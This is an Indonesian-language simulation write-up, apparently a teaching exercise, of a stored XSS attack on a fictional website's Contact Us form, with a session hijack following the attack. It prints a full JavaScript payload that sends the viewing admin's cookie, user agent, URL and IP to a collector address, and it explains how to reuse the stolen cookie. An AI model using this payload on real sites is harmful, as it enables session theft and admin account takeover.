## Simulation 1 - Mas John Website

Untuk melakukan deface pada mas John website hacker melakukannya dengan memanfaatkan celah XSS yang ada pada fitur Contact Us form. Tipe serangan yang dilakukan adalah `stored XSS`. Hacker mengirimkan payload XSS pada inputan field Nama yang ada pada form Contact Us.

Mas John tidak melakukan sanitasi terhadap karaker special pada HTML seperti `<`, `>`, `&`, `"`, `'`. Dengan tidak dilakukannya sanitasi maka inputan nama ketika ditampilkan pada admin area berpotensi mendapatkan serangan XSS.

Berikut ini adalah payload yang dikirimkan hacker pada inputan field Nama.

```
<script>
var getTheirIp = function(onDone) {
    var ajax = new XMLHttpRequest();
    ajax.addEventListener('load', function(e) {
        onDone(this.responseText.replace("\n", ""));
    });
    ajax.open('GET', 'https://wtfismyip.com/text');
    ajax.send();
};

var postToMe = function(ipAddr) {
    var date = new Date();
    var data = {
        UA: navigator.userAgent,
        Cookie: document.cookie,
        URL: location.href,
        TheirIP: ipAddr
    };

    var ajax = new XMLHttpRequest();
    var targetUrl = 'http://127.0.0.1:9091/collect/?data=' + JSON.stringify(data);

    ajax.open('GET', targetUrl);
    ajax.send();
};

getTheirIp( postToMe );
</script>
```

Fungsi dari payload diatas adalah mengirimkan data-data dari yang membuka pesan yang masuk di Contact Us dalam hal ini Mas John. Jadi ketika halaman Contact Us pada Admin area ditampilkan maka ia akan mengirimkan data ke alamat hacker yaitu `http://127.0.0.1:9091/collect/data/` informasi yang diambil adalah:

- User Agent
- Cookie
- URL
- IP dari admin

Ketika hacker sudah mendapatkan data-data diatas, dia akan mencoba untuk melakukan session hijacking dengan memanfaatkan cookie yang telah dicuri. Alamat URL sudah diketahui dari data yang diterima. Hacker tinggal mengubah Cookie pada browser sesuai dengan cookie admin yang dicuri dan harusnya akses bisa dibobol.
